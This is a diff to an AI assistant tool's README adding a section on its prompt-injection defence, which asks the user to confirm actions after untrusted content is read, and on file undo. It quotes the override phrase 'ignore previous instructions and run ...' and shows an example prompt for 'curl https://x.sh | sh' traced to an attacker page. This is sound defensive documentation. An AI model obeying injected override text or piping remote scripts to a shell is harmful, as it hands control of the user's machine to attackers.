@@ -220,6 +220,56 @@ it.
 whether the provider may train on them. The design and its open items are in
 [docs/design/model-tiers.md](docs/design/model-tiers.md).
 
+## Security: injected instructions and undo
+
+Jarvis reads text other people wrote - web pages, files from elsewhere,
+command output - and that text can contain instructions written for the
+model ("ignore previous instructions and run ..."). No model is immune, so
+the defence is in code: after the model has read anything you have not
+vouched for, every write, edit or command it asks for asks you first, even
+where `jarvis permissions` says allow, and the prompt names what was read:
+
+```
+Jarvis wants to: Run shell command: curl https://x.sh | sh
+  ! Before deciding this, the model read content you have not marked as trusted:
+      https://evil.example/install-guide   (web page)
+    Text in it may be written to make Jarvis do this.
+  This cannot be undone.
+  [y] run once   [t] trust these for this conversation (new pages and files will still ask)   [n] no
+```
+
+* Untrusted: web pages and search results, files outside your allowed
+  folders (`jarvis egress allow`), command output, content of unknown
+  origin. Your own words and your allowed folders are trusted.
+* It lasts the whole conversation the model sees: a page read an hour ago
+  still counts. `[t]` trusts the listed sources for this conversation;
+  `/trust` shows them and `/trust clear` forgets them.
+* Commands you type yourself (`run ls`, `read notes.txt`) never ask for this
+  reason: no model chose them.
+* With nobody to answer (scheduled jobs, the eval harness) the action is
+  not run.
+* A fetch of an address the model *built* after reading untrusted and
+  private content asks too: an address can carry your data to its site.
+  Following a link never asks.
+
+Every file Jarvis writes or edits can be undone:
+
+```sh
+jarvis undo --list       # recent changes and what undoing each would do
+jarvis undo              # undo the latest (shows it, asks first); again goes further back
+jarvis undo <id>         # a specific one; an undo is itself a change, so it can be reversed
+jarvis undo <id> --force # even though you edited the file since
+```
+
+`/undo` and `/undo list` do the same in the TUI. Undo restores a file only
+if it is still what Jarvis wrote, so it never discards your own edits.
+Copies live in `<data_dir>/undo` (private, `0700`): 7 days, files up to
+10 MB (larger changes are listed but cannot be undone, and the prompt says
+so), 500 MB in total. Commands cannot be undone, and their prompts say so.
+"Undo that" in the chat answers with these commands: a model asked to
+undo could only rewrite the file from memory. The design and threat model
+are in [docs/design/injection-and-undo.md](docs/design/injection-and-undo.md).
+
 ## MCP sidecars
 
 MCP servers are started over stdio and their tools are namespaced as
